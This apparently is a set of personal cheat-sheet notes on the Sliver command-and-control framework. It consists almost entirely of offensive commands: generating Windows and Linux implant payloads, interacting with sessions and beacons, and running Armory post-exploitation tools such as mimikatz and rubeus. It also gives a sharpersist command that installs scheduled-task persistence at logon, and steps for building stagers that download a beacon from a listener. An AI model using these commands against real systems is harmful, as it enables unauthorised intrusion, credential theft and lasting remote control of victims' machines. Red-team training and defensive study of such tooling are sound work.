* import profile `sliver-client-linux import [PROFILE.cfg]`
* jobs - running listeners
* sessions - running sessions

## Payloads
* `generate --http [ADDR]:[PORT] -f exe --skip-symbols`
* `--os [Windows|Linux]`
* `--arch [x64|x64|ARM]`
* beacons will sleep by default for 60 seconds `interactive` makes it more like a shell

## Sessions
* `sessions -i [ID]` to interact
* `use [BEACON]` to interact

## Armory
* extension engine that lets you run post exploitation tools in sliver
* mimikatz, bloodhound, seatbelt, rubeus, etc.
* sharpersist - installs persistence automatically
		* `sharpersist -- -t schtask -c '[PATH]' -n "WinStart" -m add -o logon`

## Chains
* instead of your sliver server being a listener the beacon becomes a listener
* creates a chain of beacons > if one goes down you lose the rest of the chain

## Stagers
* you create a profile that determines how things behave
* `profiles new --http IP:80 --format shellcode --jitter 3 --arch amd64 win64` creates a profile
* `stage-listener --url http:URL:PORT --profile win64` creates the stager listener
* `generate stager --lhost IP --lport PORT --arch amd64 --os windows` creates the actual stager
* stager will reach out to the listener to download the beacon